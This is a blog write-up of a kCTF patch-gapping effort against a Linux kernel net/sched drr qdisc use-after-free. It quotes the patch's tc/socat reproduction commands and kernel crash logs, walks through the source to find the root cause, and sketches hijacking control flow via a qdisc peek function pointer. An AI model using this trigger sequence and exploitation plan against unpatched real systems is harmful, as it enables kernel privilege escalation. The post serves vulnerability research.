---
layout: post
title: "Patch-Gapping the Google Container-Optimized OS for $0"
date: 2025-02-13
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - kCTF
  - CTF
  - Kernel
  - Exploit
---

## Background
I'm trying to really focus this year on developing technically in a few ways. Part of that is reviewing kCTF entries. This helps me get a sense of what subsystems are producing the most bugs at the moment in the program and also keeps me up to date on buggy patterns to look for. Also I get to shamelessly steal players' exploitation techniques as well. A lot of recent bugs have come from `/net/sched` so I was looking at patches for the subsystem and found a patch that claimed an exploitable UAF was possible. That patch is [here](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=bc50835e83f60f56e9bec2b392fb5544f250fb6f). I didn't realize at the time, but "Lion Ackermann" mentioned in the patch as the bug discoverer (and presumably exploiter) is a kCTF player.

I checked and discovered that at the time I found the patch the COS 105 instance in kCTF was still vulnerable to this bug. I stopped looking then, but lesson learned, the LTS instance was also still vulnerable. I don't know exactly how the rules work, but this bug was exploited as a 0day entry as per the public kCTF responses spreadsheet in December, but at the time I started working on it, there were no patch links in the spreadsheet for this bug and the instances remained unpatched.

At this point I started trying to figure out the bug and possibly exploit it. My goal was to patch-gap the COS 105 instance with a 1day entry. Shortly after I began investigating the bug, a new release was announced, but luckily the new instances would be vulnerable as well as they had also not been patched. Since the COS 105 slot was unexploited, and the upcoming COS 105 instance would also be vulnerable, I mistakenly took this as a signal to not rush as the instance would probably remain unexploited while I worked on the project slowly. In hindsight, I should've worked harder on this as the COS 105 instance was exploited a few hours before I finished. It may be moot anyways since the bug was exploited previously in the program as a 0day, still not sure about that. Anyways, I encountered some self-inflicted roadblocks that really hindered my progress, we'll get into those. Next time I'll work harder and dedicate more time to the effort instead of just a few hours here and there at night. 

## Patch Analysis
The patch text is very descriptive and provides a nice proof-of-concept to reproduce the buggy condition:
```terminal
net: sched: Disallow replacing of child qdisc from one parent to another
Lion Ackermann was able to create a UAF which can be abused for privilege
escalation with the following script

Step 1. create root qdisc
tc qdisc add dev lo root handle 1:0 drr

step2. a class for packet aggregation do demonstrate uaf
tc class add dev lo classid 1:1 drr

step3. a class for nesting
tc class add dev lo classid 1:2 drr

step4. a class to graft qdisc to
tc class add dev lo classid 1:3 drr

step5.
tc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024

step6.
tc qdisc add dev lo parent 1:2 handle 3:0 drr

step7.
tc class add dev lo classid 3:1 drr

step 8.
tc qdisc add dev lo parent 3:1 handle 4:0 pfifo

step 9. Display the class/qdisc layout

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 limit 1000p
 qdisc drr 3: dev lo parent 1:2

step10. trigger the bug <=== prevented by this patch
tc qdisc replace dev lo parent 1:3 handle 4:0

step 11. Redisplay again the qdiscs/classes

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 1:3 root leaf 4: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p
 qdisc drr 3: dev lo parent 1:2

Observe that a) parent for 4:0 does not change despite the replace request.
There can only be one parent.  b) refcount has gone up by two for 4:0 and
c) both class 1:3 and 3:1 are pointing to it.

Step 12.  send one packet to plug
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))
step13.  send one packet to the grafted fifo
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))

step14. lets trigger the uaf
tc class delete dev lo classid 1:3
tc class delete dev lo classid 1:1

The semantics of "replace" is for a del/add _on the same node_ and not
a delete from one node(3:1) and add to another node (1:3) as in step10.
While we could "fix" with a more complex approach there could be
consequences to expectations so the patch takes the preventive approach of
"disallow such config".
```

The bug here is that a qdisc can be "re-parented" to a class that is not its original parent. This kind of logic was not intended. When you create these types of classes that can have qdiscs attached, a default qdisc is allocated and you can graft a new qdisc to the class afterwards to replace the current qdisc. So you can see that `class 1:3` is first created and then we graft a qdisc onto it in step 8. This will free the default qdisc and instantiate this one in its place and attach it to the class. 

The bug however, lets you graft that qdisc (handle 4:0) onto a different class by using the same grafting mechanism that we used on 3:1 but now we're grafting the same qdisc onto two classes. The patch points out the side effects of this bug are basically this:
1. From qdisc 4:0's point of view, it's parent is still class 3:1, that is never changed
2. From class 3:1's perspective, qdisc 4:0 is still its child qdisc
3. From class 1:3's perspective, qdisc 4:0 is now its child qdisc
4. The refcount on the qdisc is now 2: 1 from the initial graft onto 3:1 and another 1 from the re-parent graft onto 1:3

So those are the side effects the bug produces. At this point, I didn't know a single thing about `/net/sched`, classes, qdiscs, etc, so the learning curve during this process was steep. I had never dealt with this subsystem before in my life. But after a lot of Googling and ChatGPTing, I was able to reproduce the PoC in the patch with the `tc` utility just as the patch specifies. I went through all the steps and when I got to step 14 and it was time to trigger the UAF, I got the following splat after deleting class 1:3\:
```terminal
[   10.519000] ------------[ cut here ]------------
[   10.521778] list_del corruption, ffff8fdd50a008d0->next is NULL
[   10.525296] WARNING: CPU: 0 PID: 784 at lib/list_debug.c:49 __list_del_entry_valid+0x59/0xd0
[   10.530218] Modules linked in:
[   10.532091] CPU: 0 PID: 784 Comm: tc.bin Not tainted 5.15.173+ #1
[   10.535676] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.14.0-2 04/01/2014
[   10.540545] RIP: 0010:__list_del_entry_valid+0x59/0xd0
[   10.543555] Code: 48 8b 00 48 39 f8 75 67 48 8b 52 08 48 39 c2 75 74 b8 01 00 00 00 c3 cc cc cc cc 48 89 fe 48 c7 c7 80 71 cf a7 e8 e3a
[   10.554231] RSP: 0018:ffffa1020168b940 EFLAGS: 00010282
[   10.557286] RAX: 0000000000000000 RBX: ffff8fdd50a00880 RCX: 0000000000000000
[   10.561417] RDX: 0000000000000000 RSI: ffffa1020168b770 RDI: 00000000ffffffea
[   10.565575] RBP: 0000000000010003 R08: 00000000ffffdfff R09: 0000000000000001
[   10.570036] R10: 00000000ffffdfff R11: ffffffffa8669da0 R12: 0000000000000001
[   10.574238] R13: ffff8fdd44f8e000 R14: ffffffffa7ad11e0 R15: 0000000000010000
[   10.578407] FS:  000000001a406880(0000) GS:ffff8fdd5c400000(0000) knlGS:0000000000000000
[   10.583118] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   10.586532] CR2: 00000000005a6cc0 CR3: 0000000110d5a003 CR4: 0000000000370ef0
[   10.590718] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   10.594898] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   10.599087] Call Trace:
[   10.600704]  <TASK>
[   10.602011]  ? __warn+0x81/0x100
[   10.603979]  ? __list_del_entry_valid+0x59/0xd0
[   10.606673]  ? report_bug+0x99/0xc0
[   10.608785]  ? handle_bug+0x34/0x80
[   10.610901]  ? exc_invalid_op+0x13/0x60
[   10.613228]  ? asm_exc_invalid_op+0x16/0x20
[   10.615710]  ? __list_del_entry_valid+0x59/0xd0
[   10.618473]  drr_qlen_notify+0x12/0x50
[   10.620778]  qdisc_tree_reduce_backlog+0x84/0x160
[   10.623558]  drr_delete_class+0x104/0x210
[   10.625959]  tc_ctl_tclass+0x488/0x5a0
[   10.628214]  ? exc_page_fault+0x76/0x140
[   10.630556]  rtnetlink_rcv_msg+0x21e/0x350
[   10.633230]  ? security_sock_rcv_skb+0x31/0x50
[   10.635869]  ? rtnl_calcit.isra.0+0x130/0x130
[   10.638517]  netlink_rcv_skb+0x4e/0x100
[   10.640868]  netlink_unicast+0x231/0x370
[   10.643209]  netlink_sendmsg+0x250/0x4b0
[   10.645546]  __sock_sendmsg+0x5c/0x70
[   10.647746]  ____sys_sendmsg+0x25a/0x2a0
[   10.650116]  ? import_iovec+0x17/0x20
[   10.652338]  ___sys_sendmsg+0x96/0xd0
[   10.654575]  __sys_sendmsg+0x76/0xc0
[   10.656746]  do_syscall_64+0x3d/0x90
[   10.658970]  entry_SYSCALL_64_after_hwframe+0x6c/0xd6
[   10.662043] RIP: 0033:0x4e7697
[   10.663880] Code: 64 89 02 48 c7 c0 ff ff ff ff eb bb 0f 1f 80 00 00 00 00 f3 0f 1e fa 64 8b 04 25 18 00 00 00 85 c0 75 10 b8 2e 00 000
[   10.674696] RSP: 002b:00007ffc56673e38 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   10.679091] RAX: ffffffffffffffda RBX: 0000000067ae1e0c RCX: 00000000004e7697
[   10.683247] RDX: 0000000000000000 RSI: 00007ffc56673ea0 RDI: 0000000000000043
[   10.687411] RBP: 00007ffc56674fb0 R08: 00000000005978a0 R09: 000000001a4102b0
[   10.691609] R10: 000000001a4082a0 R11: 0000000000000246 R12: 0000000000578448
[   10.695807] R13: 000000000054449b R14: 00000000005af620 R15: 0000000000000001
[   10.699977]  </TASK>
[   10.701360] ---[ end trace 8e001f66f1703586 ]---
```

At this point I was excited because I thought I had recreated the bug and caused a UAF and I'd soon be looking for ways to exploit the bug; however I was extremely wrong. All this splat is is a warning that there was an invalid `list_del` operation. In my development environment, this was enough to cause a kernel panic. I had KASAN enabled so if there was a UAF I would've seen a different splat, so now I'm very confused. On further inspection, I never even reached the step where I delete class 1:1 as in the PoC, so what is going on? Why does my PoC stop here on this `list_del` operation? Time to dig into the details. 

First, why do even encounter a bad `list_del` operation? We still don't know much about this bug or subsystem yet. I had basically just recreated the PoC in the patch and had done almost zero critical thinking of my own. After a lot of `printk` debugging, I finally figured out where the invalid `list_del` comes from.

## List Bug Analysis
First of all, why is `list_del` complaining? Well it turns out that a common kernel configuration is `CONFIG_DEBUG_LIST`, which turns the list manipulation APIs, like `list_del` into more careful versions of themselves. `list_del`'s job is to remove a `list_head` node out of a linked list. If you can visualize a linked list in the kernel, it's essentially a list of nodes. Each node contains a `prev` and a `next` pointer that reference the previous and the next node in the list respectively. So the debug list configuration has some sanity checks that make sure that when you go to remove a node from a list, there hasn't been any corruption of the node itself. When we delete class 1:3, something happens during that process and we end up here:
```c
static inline void __list_del_entry(struct list_head *entry)
{
	if (!__list_del_entry_valid(entry))
		return;

	__list_del(entry->prev, entry->next);
}
```

Things are going awry in the `__list_del_entry_valid` check it seems:
```c
/*
 * Performs list corruption checks before __list_del_entry(). Returns false if a
 * corruption is detected, true otherwise.
 *
 * With CONFIG_LIST_HARDENED only, performs minimal list integrity checking
 * inline to catch non-faulting corruptions, and only if a corruption is
 * detected calls the reporting function __list_del_entry_valid_or_report().
 */
static __always_inline bool __list_del_entry_valid(struct list_head *entry)
{
	bool ret = true;

	if (!IS_ENABLED(CONFIG_DEBUG_LIST)) {
		struct list_head *prev = entry->prev;
		struct list_head *next = entry->next;

		/*
		 * With the hardening version, elide checking if next and prev
		 * are NULL, LIST_POISON1 or LIST_POISON2, since the immediate
		 * dereference of them below would result in a fault.
		 */
		if (likely(prev->next == entry && next->prev == entry))
			return true;
		ret = false;
	}

	ret &= __list_del_entry_valid_or_report(entry);
	return ret;
}
```

Which in turn calls `__list_del_entry_valid_or_report` because we do indeed have `CONFIG_DEBUG_LIST` enabled:
```c
bool __list_del_entry_valid_or_report(struct list_head *entry)
{
	struct list_head *prev, *next;

	prev = entry->prev;
	next = entry->next;

	if (CHECK_DATA_CORRUPTION(next == NULL,
			"list_del corruption, %px->next is NULL\n", entry) ||
	    CHECK_DATA_CORRUPTION(prev == NULL,
			"list_del corruption, %px->prev is NULL\n", entry) ||
	    CHECK_DATA_CORRUPTION(next == LIST_POISON1,
			"list_del corruption, %px->next is LIST_POISON1 (%px)\n",
			entry, LIST_POISON1) ||
	    CHECK_DATA_CORRUPTION(prev == LIST_POISON2,
			"list_del corruption, %px->prev is LIST_POISON2 (%px)\n",
			entry, LIST_POISON2) ||
	    CHECK_DATA_CORRUPTION(prev->next != entry,
			"list_del corruption. prev->next should be %px, but was %px. (prev=%px)\n",
			entry, prev->next, prev) ||
	    CHECK_DATA_CORRUPTION(next->prev != entry,
			"list_del corruption. next->prev should be %px, but was %px. (next=%px)\n",
			entry, next->prev, next))
		return false;

	return true;
}
```

So what's going on? We don't know much about the `/net/sched` code yet, but it appears that because we have `CONFIG_DEBUG_LIST`, there is a check on the node you want to remove from the list. If you had the following linked list:
```terminal
A -> B -> C -> D -> A
```
Each node in the list would point to its neighbors, for instance, for node `D` it would have the node `C` in its `prev` field and it would have node `A` in its `next` field because the list is circular. The validity check here makes sure that if you want to delete node `D` for instance, that the node `C` says it's next node is `D` and that node `A` says its previous node is `D`. Makes sense. But in our `list_del` `WARN()` banner we see that this function returns false because `list_del corruption, ffff8fdd50a008d0->next is NULL`. So we can't even check the neighboring nodes for sanity because our node `D` doesn't even have a `next` field value, it's `NULL`. 

Ok so we fail this `list_del` and the PoC just dies here because when we delete class 1:3 the `list_head` that we submit for deletion at some point in the `/net/sched` is either corrupted or it was never initialized. So let's now figure out what is going on in `/net/sched` when this bug occurs to see if we can figure out what is happening. 

## Sched Bug Analysis
Taking a deeper dive into the `/net/sched` code it became clear why the node that we were deleting was in a buggy state. In the PoC we create a class 1:1 and assign it a qdisc of type `plug`. A `plug` qdisc is meant to literally stop packets from being dequeued until its given an explicit release command or deleted, it plugs up the `qdisc` with packets as they are "enqueued". So if we send a packet to class 1:1, that packet will be enqueued in 1:1's qdisc that is a plug type, meaning those packets will sit there until we explicitly ask for them. So at this point, it's clear that for some reason, making sure packets are held in the plug qdisc is crucial to the PoC. But what about our buggy `list_head` node? It's clear that after we send a packet to class 1:1 and the plug qdisc, we send a packet to 1:3. Class 1:3 is the class that we grafted the already existing pfifo qdisc onto from 3:1 when we exercised the re-parenting bug. Let's take a look at what happens when we send a packet to a class, namely class 1:3\:
```c
static int drr_enqueue(struct sk_buff *skb, struct Qdisc *sch,
		       struct sk_buff **to_free)
{
	unsigned int len = qdisc_pkt_len(skb);
	struct drr_sched *q = qdisc_priv(sch);
	struct drr_class *cl;
	int err = 0;
	bool first;

	cl = drr_classify(skb, sch, &err);		// [1]
	if (cl == NULL) {
		if (err & __NET_XMIT_BYPASS)
			qdisc_qstats_drop(sch);
		__qdisc_drop(skb, to_free);
		return err;
	}

	first = !cl->qdisc->q.qlen;			// [2]
	err = qdisc_enqueue(skb, cl->qdisc, to_free);	// [3]
	if (unlikely(err != NET_XMIT_SUCCESS)) {
		if (net_xmit_drop_count(err)) {
			cl->qstats.drops++;
			qdisc_qstats_drop(sch);
		}
		return err;
	}

	if (first) {
		list_add_tail(&cl->alist, &q->active);	// [4]
		cl->deficit = cl->quantum;
	}

	sch->qstats.backlog += len;
	sch->q.qlen++;
	return err;
}
```

There's a few important things going in here. I've not yet mentioned the `drr` aspect of this which stands for "Deficit Round Robin" which is the type of algorithm used to determine how packet delivery is scheduled in this PoC. The details of the DRR algorithm are not super important, but from what I have learned at a high level it basically keeps track of what classes are currently "active", ie, have packets enqueued to them, and tries to deliver the packets based on "deficits" that are configurable. So this way we make sure that packets are distributed in a way that makes sense to us as an end-user trying to shape traffic or guarantee some quality of service. This function is invoked when the qdisc we set up in step 1 has been enqueued with a packet (at the interface level, we use loopback): 

- `[1]`: In this step we have a packet, and we attempt to classify the packet into one of the existing `drr` classes that belong in the root qdisc hierarchy with the `drr_classify` function

- `[2]`: If we find a class that matches for the packet, ie the priority matches a class we have setup like 1:3, we check class 1:3's qdisc and see if it has been enqueued with any packets, if it has not, the `first` flag is set to true

- `[3]`: Class 1:3's qdisc is enqueued with a packet

- `[4]`: If this was the class's first packet, this packet needs to be placed on the `drr` scheduler's `active` list which contains `list_head` structs for every `drr` class that has packets enqueued so that the scheduler can apply the algorithm and make sure packets are dequeued appropriately

Everything in here makes sense and after printing out the class and qdisc pointer values and lining them up with allocations from the PoC when we set up the hierarchy, nothing seemed amiss here. Let's look at the backtrace from when the `list_del` `WARN()` occurs to see what function that occurred in:
```terminal 
[   10.602011]  ? __warn+0x81/0x100
[   10.603979]  ? __list_del_entry_valid+0x59/0xd0
[   10.606673]  ? report_bug+0x99/0xc0
[   10.608785]  ? handle_bug+0x34/0x80
[   10.610901]  ? exc_invalid_op+0x13/0x60
[   10.613228]  ? asm_exc_invalid_op+0x16/0x20
[   10.615710]  ? __list_del_entry_valid+0x59/0xd0
[   10.618473]  drr_qlen_notify+0x12/0x50
[   10.620778]  qdisc_tree_reduce_backlog+0x84/0x160
[   10.623558]  drr_delete_class+0x104/0x210
[   10.625959]  tc_ctl_tclass+0x488/0x5a0
```

So we land in `drr_qlen_notify` from a call to `drr_delete_class`:
```c
static int drr_delete_class(struct Qdisc *sch, unsigned long arg,
			    struct netlink_ext_ack *extack)
{
	struct drr_sched *q = qdisc_priv(sch);
	struct drr_class *cl = (struct drr_class *)arg;

	if (cl->filter_cnt > 0)
		return -EBUSY;

	sch_tree_lock(sch);

	qdisc_purge_queue(cl->qdisc);				// [1]
	qdisc_class_hash_remove(&q->clhash, &cl->common);	// [2]

	sch_tree_unlock(sch);

	drr_destroy_class(sch, cl);
	return 0;
}
```
- `[1]`: In this step we purge the class's qdisc, which in our case would be our buggy qdisc that we re-parented to 1:3 from 3:1

- `[2]`: Remove this class's hash from the scheduler's class hash table so that it cannot be looked up again

The source doesn't quite match with the back trace, probably because of inlining, but we end up in `drr_qlen_notify` from `qdisc_purge_queue` calling `qdisc_tree_reduce_backlog` as part of the qdisc cleaning up process. This is where our buggy state reveals itself
```c
void qdisc_tree_reduce_backlog(struct Qdisc *sch, int n, int len)
{
	bool qdisc_is_offloaded = sch->flags & TCQ_F_OFFLOADED;
	const struct Qdisc_class_ops *cops;
	unsigned long cl;
	u32 parentid;
	bool notify;
	int drops;

	if (n == 0 && len == 0)
		return;
	drops = max_t(int, n, 0);
	rcu_read_lock();
	while ((parentid = sch->parent)) {				// [1]
		if (parentid == TC_H_ROOT)
			break;

		if (sch->flags & TCQ_F_NOPARENT)
			break;
		/* Notify parent qdisc only if child qdisc becomes empty.
		 *
		 * If child was empty even before update then backlog
		 * counter is screwed and we skip notification because
		 * parent class is already passive.
		 *
		 * If the original child was offloaded then it is allowed
		 * to be seem as empty, so the parent is notified anyway.
		 */
		notify = !sch->q.qlen && !WARN_ON_ONCE(!n &&
						       !qdisc_is_offloaded);
		/* TODO: perform the search on a per txq basis */
		sch = qdisc_lookup(qdisc_dev(sch), TC_H_MAJ(parentid)); 
		if (sch == NULL) {
			WARN_ON_ONCE(parentid != TC_H_ROOT);
			break;
		}
		cops = sch->ops->cl_ops;				// [2]
		if (notify && cops->qlen_notify) {
			cl = cops->find(sch, parentid);			// [3]
			cops->qlen_notify(sch, cl);			// [4]
		}
		sch->q.qlen -= n;
		sch->qstats.backlog -= len;
		__qdisc_qstats_drop(sch, drops);
	}
	rcu_read_unlock();
}
```

- `[1]`: We use the parentid that is derived from the qdisc. This is where the problem is, remember that one of the effects of the bug was that the qdisc itself doesn't know that it was reparented to 1:3, its parentid is still going to reference class 3:1

- `[2]`: Grab a reference to the function table for the qdisc's class's `ops` member so that we do a class appropriate search, ie `drr`

- `[3]`: Use the class ops to execute the `find` function `drr_search_class`

- `[4]`: We set `cl` to class 3:1 because according to the buggy qdisc, that is its class parent still

- `[5]`: We call the class ops `qlen_notify` function, which for `drr` is `drr_qlen_notify`

```c
static void drr_qlen_notify(struct Qdisc *csh, unsigned long arg)
{
	struct drr_class *cl = (struct drr_class *)arg;

	list_del(&cl->alist);
}
```

And here is the problem! We call `list_del` on class 3:1's `alist` member which is an uninitialized `list_head`. Its `list_head` is uninitialized (NULL) because it was never placed on the drr scheduler's active list because when we enqueued packets into class 1:3, it was class 1:3's `alist` that was initialized and inserted into the scheduler's active class list. This explains why we get the splat. 

That's one mystery solved, but why does our PoC stop at deleting class 1:3 on a `list_del` bug and the patch mentions UAF and includes deleting class 1:1?

## Shooting Myself in the Foot
At this point I was happy to have discovered why we were encountering the list bug, but still didn't see how this bug was exploitable or could lead to UAF. I started to suspect that the PoC in the patch was just to prove there was in fact an issue and not directly expose a UAF exactly. This was a horrible assumption that led me very astray. For probably two days worth of effort, I read all of the code over and over looking for ways that I could get a UAF on the buggy qdisc object. I don't know why I assumed that the UAF must be on the buggy qdisc, but the fact that it appeared to belong to two separate classes weighed heavy in my mind. The issue I kept coming back to was: the qdisc's refcount is correct, it's 2, so how could it be the UAF object? I tried to find ways that I could free the qdisc, but still retain a reference to it via class 1:3 or class 3:1 in hopes that that would be the way to access the UAF. 

After a couple of days of trying lots of different strategies and thinking about it, I realized that there was no way to free the qdisc from this buggy condition. If you delete its real parent in 3:1 you have no way grab a handle to it again, because non-root qdiscs must have a classid. So you can't even look up the qdisc without providing a classid. If you delete 1:3, it will remove a refcount from the qdisc, but now everything is normal, it has a refcount of 1 and belongs to class 3:1. 

I was very frustrated at this part and decided to start over, maybe I missed something in the patch. I fixated on the fact that in the patch they specifically say "lets trigger the UAF" and the action includes deleting 1:1. To this point, I was never able to even delete 1:1 because I get stuck panicking on the list bug. After toying with the idea of first initializing 3:1's `alist` appropriately and getting it added to the active list for the scheduler to bypass the list bug, I decided to just quickly make sure there was nothing wrong with my setup. Mind you, I've been working in this environment for 2-3 days at this point getting familiar with the bug, reading the code, debugging, brainstorming about ways to get a UAF on the qdisc, etc. 

I revisited the list code we discussed above. There were those `CHECK_DATA_CORRUPTION` invocations in the `__list_del_entry_valid_or_report` function like this:
```c
#define CHECK_DATA_CORRUPTION(condition, addr, fmt, ...)		 \
	check_data_corruption(({					 \
		bool corruption = unlikely(condition);			 \
		if (corruption) {					 \
			if (addr)					 \
				mem_dump_obj(addr);			 \
			if (IS_ENABLED(CONFIG_BUG_ON_DATA_CORRUPTION)) { \
				pr_err(fmt, ##__VA_ARGS__);		 \
				BUG();					 \
			} else						 \
				WARN(1, fmt, ##__VA_ARGS__);		 \
		}							 \
		corruption;						 \
	}))

#endif	/* _LINUX_BUG_H */
```

Welp, this is a pretty important discovery. It looks like if you have `CONFIG_BUG_ON_DATA_CORRUPTION` enabled, you will `BUG()` on an invalid list del operation and if you don't have it enabled, you will simply receive a `WARN()`. I check my kernel config in my development environment and sure enough I have `CONFIG_BUG_ON_DATA_CORRUPTION=y`. Let's check the kCTF kernel configuration: `CONFIG_BUG_ON_DATA_CORRUPTION is not set`. Yikes! This whole time I was stuck on the list delete operation, days, was because I had the wrong kernel configuration. I felt awful about this but going forward I'll obviously make my environment more kCTF like from the beginning. 

## Finally a UAF to Investigate
Once I had the right kernel configuration, I re-ran the PoC and behold:
```terminal
[   26.091921] ==================================================================
[   26.093519] BUG: KASAN: slab-use-after-free in __list_del_entry_valid+0x7a/0x140
[   26.095252] Read of size 8 at addr ffff8880134c0558 by task tc.bin/816
[   26.096631] 
[   26.097090] CPU: 0 PID: 816 Comm: tc.bin Tainted: G        W          6.5.13 #92
[   26.098817] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   26.100720] Call Trace:
[   26.101297]  <TASK>
[   26.101771]  dump_stack_lvl+0x48/0x60
[   26.102612]  print_report+0xc2/0x600
[   26.103384]  ? __virt_addr_valid+0xc7/0x140
[   26.104294]  ? __list_del_entry_valid+0x7a/0x140
[   26.105306]  kasan_report+0xb6/0xf0
[   26.106059]  ? __list_del_entry_valid+0x7a/0x140
[   26.107056]  __list_del_entry_valid+0x7a/0x140
[   26.108001]  drr_qlen_notify+0x60/0xd0
[   26.108812]  qdisc_tree_reduce_backlog+0xf6/0x1f0
[   26.109827]  drr_delete_class+0x16e/0x2a0
```

We finally have a UAF and it happens when you go to delete class 1:1. So the PoC was entirely correct the whole time, and it was my bad kernel config and my assumptions about what must be happening (an impossible UAF on the qdisc) that led me astray for so long. As you can see from the backtrace, we know this code path well. This is the exact code path that leads to the initial list del bug we encountered when we were deleting class 1:3. 

So now everything clicked for me. When we delete class 1:1 it is trying to unlink its `alist` `list_head` from the drr scheduler's `active` list and when it does its `list_del` sanity checks, it's accessing the freed 1:3 class's `list_head` that remains in the `active` list even though we destroyed class 1:3. This is because we never removed it from the active list, the `list_del` we attempted tried to unlink class 3:1's `list_head` instead. So this is where the UAF access comes from. 

So now can we reason about how to exploit the UAF. From here, I created a similar PoC in my exploit just to make sure I had the right constituent parts but was able to reduce the complexity a bit because in hindsight, the bug is quite simple once you understand all of the moving parts. There are aspects of my exploit setup that are not strictly required, but keeping it relatively close to the PoC helped me initially and then I just left the code in there. 

Here are the steps I followed to trigger the bug:
1. Create a root qdisc for the loopback interface that is of type drr
2. Create class 1:1 of type drr
3. Create class 1:3 of type drr
4. Assign a plug qdisc to class 1:1
5. Assign a pfifo (default type) qdisc to 1:3, this will be our reparented buggy qdisc later
6. Create class 1:2 of type drr and reparent 1:3's qdisc to 1:2, triggering the bug
7. Enqueue packets in 1:1 and 1:2, this will place 1:1 and 1:2 class `alist` `list_head` nodes in the scheduler's active list
8. Delete class 1:1, I do this first because it will require sane `list_head` values for class 1:2 when it removes itself from the active list
9. Delete class 1:2, this will fail to remove 1:2's `list_head` from the active list but will free the class
10. ?? Profit

So now we have to find out how the active list is used so that we can see how we can access our freed class that has a reference cached in the active list. A quick grep for `active` in `sch_drr.c` will lead you to `drr_dequeue`:
```c
static struct sk_buff *drr_dequeue(struct Qdisc *sch)
{
	struct drr_sched *q = qdisc_priv(sch);
	struct drr_class *cl;
	struct sk_buff *skb;
	unsigned int len;

	if (list_empty(&q->active))	// [1]
		goto out;
	while (1) {
		cl = list_first_entry(&q->active, struct drr_class, alist); // [2]
		skb = cl->qdisc->ops->peek(cl->qdisc); // [3]
		if (skb == NULL) {
			qdisc_warn_nonwc(__func__, cl->qdisc);
			goto out;
		}

		len = qdisc_pkt_len(skb);
		if (len <= cl->deficit) {
			cl->deficit -= len;
			skb = qdisc_dequeue_peeked(cl->qdisc);
			if (unlikely(skb == NULL))
				goto out;
			if (cl->qdisc->q.qlen == 0)
				list_del(&cl->alist);

			bstats_update(&cl->bstats, skb);
			qdisc_bstats_update(sch, skb);
			qdisc_qstats_backlog_dec(sch, skb);
			sch->q.qlen--;
			return skb;
		}

		cl->deficit += cl->quantum;
		list_move_tail(&cl->alist, &q->active);
	}
out:
	return NULL;
}
```

- `[1]`: This function gets invoked whenever a packet is received on the root drr qdisc's interface and the way the drr algorithm works is it looks through its active packet flows and tries to dequeue packets based on the requirements of each active class. It first checks to make sure there are actually active classes on the scheduler's active list. Our buggy class is on the active list thankfully because of class 1:1 making sure that no packets are dequeued by virtue of its plug qdisc. So tip of the cap to the patch author and Lion Ackermann, thank you! 

- `[2]`: In a while loop, we first get a handle to the first `struct drr_class` on the active list. Since we deleted class 1:1 who had packets enqueued in its plug qdisc first, this first class should be our UAF class

- `[3]`: This is is what caught my eye, since we have a UAF on `cl`, we potentially can hijack RIP here since we can possibly control the entirety of `cl->qdisc->ops->peek()` and replace `peek()` with a function of our choice

Now it was time to develop an exploit plan.

## Exploit Plan
Seeing that we invoke `cl->qdisc->ops->peek()`, I was confident that I could hijack execution. This turned out to be entirely true, at this point I told some friends that all I had to do was some ROP and I'd be on my way to capturing the flag. This turned out to be entirely false and completing the exploit was a lot more difficult than I anticipated. The main issue I had trying to ROP was that I couldn't find a stack-pivot gadget that worked with our register control at the time that we hijack execution in order for us to start ROP'ing:
```terminal
$rax   : 0xffffffff81356310					// [1]
$rbx   : 0xffff88800f295bd0					// [2]
$rcx   : 0x20000           
$rdx   : 0x0               
$rsp   : 0xffffc9000188baf0
$rbp   : 0xffff888006d19e00
$rsi   : 0x0               
$rdi   : 0xffffffff84267b88					// [3]
$rip   : 0xffffffff81d71bd8
$r8    : 0x1               
$r9    : 0xffffc9000188bb90
$r10   : 0xffff88800f2719e0
$r11   : 0xffff888006b6a660
$r12   : 0xffff888006d19f40
$r13   : 0x0               
$r14   : 0xffff888006d19e00
$r15   : 0xffff888006d19e00
$eflags: [zero CARRY parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x10 $ss: 0x18 $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0xffffffff81d71bcc <drr_dequeue+44> mov    rdi, QWORD PTR [rbx+0x10]
   0xffffffff81d71bd0 <drr_dequeue+48> mov    rax, QWORD PTR [rdi+0x18]
   0xffffffff81d71bd4 <drr_dequeue+52> mov    rax, QWORD PTR [rax+0x38]
 → 0xffffffff81d71bd8 <drr_dequeue+56> call   rax
```

Here I'm showing you the GDB output when we we're about to `call rax` which is when we call the `peek` that we hijack. We have the following register control:
- `[1]`: `rax` ends up being the function address we want to call, so any ROP stack pivot that utilizes `rax` would be self-referential in a way that made it difficult to find an appropriate gadget

- `[2]`: `rbx` ends up being an address inside our UAF class. This is great for us as this could represent a way to stack-pivot since we control the contents around this address; however, I was unable to find any stack pivot gadgets that help us here

- `[3]`: `rdi` ends up being the address of the UAF class's qdisc. Again, this would great for us because we control this memory but I was unable to find an appropriate stack pivot gadget

To be quite honest, I didn't spend too much time trying to make ROP work, there were perhaps gadgets or strategies that I didn't think of or consider that would've enabled me to use ROP but I gave up pretty quickly, probably a couple hours or so of looking. I figured with our precise control over `rdi` and the fact that we have what amounts to an arbitrary function call primitive, I felt like there *had* to be gadgets (single function calls) we could leverage to capture the flag. 

